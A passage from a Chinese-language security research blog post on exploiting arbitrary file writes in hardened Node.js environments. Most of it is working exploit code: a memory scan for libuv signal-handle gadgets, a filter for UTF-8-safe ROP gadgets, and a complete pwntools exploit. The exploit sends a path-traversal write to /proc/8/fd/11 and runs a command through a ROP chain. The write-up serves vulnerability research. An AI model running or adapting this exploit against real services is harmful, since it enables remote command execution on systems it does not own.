data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_useful_gadget</span>(<span class="params">out</span>):</span></span><br><span class="line">    dis_list = out.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> n, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(dis_list):</span><br><span class="line">        <span class="keyword">if</span> x == <span class="string">&#x27;ret&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n):</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;bad&#x27;</span> <span class="keyword">in</span> dis_list[_] :</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;mem1&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    mem1 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;mem2&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    mem2 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;mem3&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    mem3 = f.read()</span><br><span class="line"></span><br><span class="line">segments = [(<span class="number">0x0000000000400000</span>, <span class="number">0x0000000004ff1000</span>-<span class="number">0x0000000000400000</span>), (<span class="number">0x00000000051f1000</span>, <span class="number">0x00000000051f4000</span>-<span class="number">0x00000000051f1000</span>), (<span class="number">0x00000000051f4000</span>, <span class="number">0x000000000520f000</span>-<span class="number">0x00000000051f4000</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr, length <span class="keyword">in</span> segments:</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(length-<span class="number">4</span>):</span><br><span class="line">        handle = addr + offset</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_valid_utf8(p64(handle-<span class="number">0x60</span>)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        signum = read_mem(handle+<span class="number">8</span>, <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_valid_utf8(signum):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        ptr = read_mem(handle, <span class="number">8</span>)</span><br><span class="line">        data = read_mem(u64(ptr), <span class="number">30</span>)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        out =  disasm(data, arch=<span class="string">&#x27;amd64&#x27;</span>, byte=<span class="literal">False</span>, offset=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> is_useful_gadget(out):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;handle&#x27;</span>,<span class="built_in">hex</span>(handle), <span class="string">&#x27;-&gt;&#x27;</span>, <span class="string">&#x27;ptr:&#x27;</span>, u64(ptr), <span class="string">&#x27;signum&#x27;</span>, <span class="built_in">hex</span>(u32(signum)))</span><br><span class="line">            <span class="built_in">print</span>(out)</span><br></pre></td></tr></table></figure>

<h3 id="ROP-Chain"><a href="#ROP-Chain" class="headerlink" title="ROP Chain"></a>ROP Chain</h3><p>当能栈迁移后， 后面就是拼接 ROP chain的流程了， 由于程序本身没有 system 、 popen 等函数的调用 ，所以我没有法直接 ret2text， 我将我的思路简单定成如下：</p>
<ul>
<li>找到一个 gadget 能从任意地址读取值， 然后赋值到某个寄存器上</li>
<li>找到一个gadget 能对可控的寄存器进行加减法运算</li>
<li>找到一个 libc 函数， 该函数与 system 的偏移满足 UTF-8 编码</li>
</ul>
<p>首先通过 ROPchain 将所有可能能用的 gadget 输出成一个文件， 然后重新过滤下看哪些地址是符合 utf-8</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_valid_utf8</span>(<span class="params">byte_seq</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        byte_seq.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">lines = [ line.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;./gadgets&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line">lines = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> line: <span class="string">&#x27; : &#x27;</span> <span class="keyword">in</span> line , lines))</span><br><span class="line">lines = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> line: line.split(<span class="string">&#x27; : &#x27;</span>),lines))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> l: is_valid_utf8(p64(<span class="built_in">int</span>(l[<span class="number">0</span>],<span class="number">16</span>))),lines ))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(i[<span class="number">0</span>],<span class="string">&#x27; : &#x27;</span>,i[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p>通过这个过滤，我找到了两条 gadget</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x0000000001097367  :  add rax, rdx ; ret</span><br><span class="line">0x0000000002176b34  :  mov rax, qword ptr [rsi] ; ret</span><br></pre></td></tr></table></figure>
<p>第i三个 libc 函数，我找到的是， <code>setegid</code> ， 它与system的偏移为  <code>0xb1f30</code> 符合 UTF-8</p>
<p>通过组合我们构造出如下 ropchain</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">content  = p64(<span class="number">0x4261af</span> - <span class="number">0x60</span>) + p64(<span class="number">0xb7d900</span>)</span><br><span class="line">content += p64(pop_rdx_ret)</span><br><span class="line">content += p64(<span class="number">0x100</span>)</span><br><span class="line">content += p64(add_rax_rdx_ret)</span><br><span class="line">content += p64(pop_rdx_ret)</span><br><span class="line">content += p64(pop_rsi_ret) <span class="comment"># next gadget</span></span><br><span class="line">content += p64(mov_rdi_rax_pop_rbp_jump_rdx)</span><br><span class="line">content += <span class="string">b&#x27;aaaaaaaa&#x27;</span> <span class="comment"># junk data</span></span><br><span class="line">content += p64(setegid_got) <span class="comment">#</span></span><br><span class="line">content += p64(mov_rax_qword_ptr_rsi_ret)</span><br><span class="line">content += p64(pop_rdx_ret)</span><br><span class="line">content += p64(<span class="number">0xb1f30</span>) <span class="comment"># setegid libc offset -&gt; system</span></span><br><span class="line">content += p64(sub_rax_rdx_ret)</span><br><span class="line">content += p64(<span class="number">0x0000000003adace7</span>) <span class="comment"># jmp rax</span></span><br><span class="line">content += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span> + <span class="string">b&#x27;; touch /tmp/hacked ; &#x27;</span></span><br></pre></td></tr></table></figure>

<p>最后就可以执行任意命令了</p>
<p>完整 exploit</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="comment"># control rip</span></span><br><span class="line"><span class="comment">#content = p64(0x4261af - 0x60) + p64(0xb7d900) + b&#x27;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content = p64(<span class="number">0x4261af</span> - <span class="number">0x60</span>) + p64(<span class="number">0xb7d900</span>) + <span class="string">b&#x27;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000427748</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000433d27</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000001634a57</span></span><br><span class="line">sub_rax_rdx_ret = <span class="number">0x00000000017e7432</span></span><br><span class="line">mov_rax_qword_ptr_rsi_ret = <span class="number">0x0000000002176b34</span></span><br><span class="line">mov_rdi_rax_pop_rbp_jmp_rdx = <span class="number">0x000000000190ade9</span></span><br><span class="line">mov_rbp_rsp_pop_rbp_ret = <span class="number">0x0000000001b1da5d</span></span><br><span class="line"></span><br><span class="line">add_rax_rdx_ret = <span class="number">0x0000000001097367</span></span><br><span class="line">jump_rsp = <span class="number">0x0000000000430657</span></span><br><span class="line">mov_rdi_rax_pop_rbp_jump_rdx = <span class="number">0x000000000190ade9</span> <span class="comment"># mov rdi, rax ; pop rbp ; jmp rdx</span></span><br><span class="line">mprotect_plt = <span class="number">0xa98eb0</span></span><br><span class="line">setegid_got = <span class="number">0x51f3f08</span></span><br><span class="line"></span><br><span class="line">content  = p64(<span class="number">0x4261af</span> - <span class="number">0x60</span>) + p64(<span class="number">0xb7d900</span>)</span><br><span class="line">content += p64(pop_rdx_ret)</span><br><span class="line">content += p64(<span class="number">0x100</span>)</span><br><span class="line">content += p64(add_rax_rdx_ret)</span><br><span class="line">content += p64(pop_rdx_ret)</span><br><span class="line">content += p64(pop_rsi_ret) <span class="comment"># next gadget</span></span><br><span class="line">content += p64(mov_rdi_rax_pop_rbp_jump_rdx)</span><br><span class="line">content += <span class="string">b&#x27;aaaaaaaa&#x27;</span> <span class="comment"># junk data</span></span><br><span class="line">content += p64(setegid_got) <span class="comment">#</span></span><br><span class="line">content += p64(mov_rax_qword_ptr_rsi_ret)</span><br><span class="line">content += p64(pop_rdx_ret)</span><br><span class="line">content += p64(<span class="number">0xb1f30</span>) <span class="comment"># setegid libc offset -&gt; system</span></span><br><span class="line">content += p64(sub_rax_rdx_ret)</span><br><span class="line">content += p64(<span class="number">0x0000000003adace7</span>) <span class="comment"># jmp rax</span></span><br><span class="line">content += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span> + <span class="string">b&#x27;; touch /tmp/hacked ; &#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;content: <span class="subst">&#123;content&#125;</span>&quot;</span>)</span><br><span class="line">data = &#123;<span class="string">&#x27;filename&#x27;</span>:<span class="string">&quot;../../../../proc/8/fd/11&quot;</span>,<span class="string">&quot;content&quot;</span>:content.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(json.dumps(data))</span></span><br><span class="line">resp = requests.post(<span class="string">&quot;http://localhost:3000/upload&quot;</span>,data = json.dumps(data),headers = &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#data =  dump.dump_all(resp.reuqest)</span></span><br><span class="line"><span class="comment">#print(resp.text)</span></span><br></pre></td></tr></table></figure>



<h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://www.sonarsource.com/blog/why-code-security-matters-even-in-hardened-environments/<a href="#fnref:1" rev="footnote"> ↩</a></span></li><li id="fn:2"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">2.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://github.com/libuv/libuv/blob/fbe2d85bd5a5c370a8cacea92b3bdfbd9f98a530/src/unix/signal.c#L433<a href="#fnref:2" rev="footnote"> ↩</a></span></li></ol></div></div></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#TL-DR"><span class="toc-number">1.</span> <span class="toc-text">TL; DR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview-Data-Structure"><span class="toc-number">3.1.</span> <span class="toc-text">Overview Data Structure</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Searching-Data-Structure-Gadgets"><span class="toc-number">3.2.</span> <span class="toc-text">Searching Data Structure Gadgets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP-Chain"><span class="toc-number">3.3.</span> <span class="toc-text">ROP Chain</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-link"><span class="toc-number">4.</span> <span class="toc-text">Reference link</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&text=Exploiting File Writes in Hardened Node.js Environments"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&title=Exploiting File Writes in Hardened Node.js Environments"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&is_video=false&description=Exploiting File Writes in Hardened Node.js Environments"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Exploiting File Writes in Hardened Node.js Environments&body=Check out this article: https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&title=Exploiting File Writes in Hardened Node.js Environments"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&title=Exploiting File Writes in Hardened Node.js Environments"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&title=Exploiting File Writes in Hardened Node.js Environments"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&title=Exploiting File Writes in Hardened Node.js Environments"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&name=Exploiting File Writes in Hardened Node.js Environments&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html&t=Exploiting File Writes in Hardened Node.js Environments"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    Swing
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133464311-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-133464311-1');
    </script>

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'swing';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


</body>
</html>
